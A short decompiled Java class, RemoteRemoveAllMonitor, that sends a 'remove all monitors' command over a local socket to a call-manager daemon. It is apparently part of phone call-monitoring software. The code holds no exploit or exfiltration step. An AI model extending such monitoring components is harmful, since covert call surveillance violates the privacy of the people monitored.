package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;

public class RemoteRemoveAllMonitor
  extends SocketCmd
{
  private static final long serialVersionUID = -4037318463895982559L;
  
  public RemoteRemoveAllMonitor(String paramString)
  {
    super(paramString, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemoteRemoveAllMonitor";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteRemoveAllMonitor.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */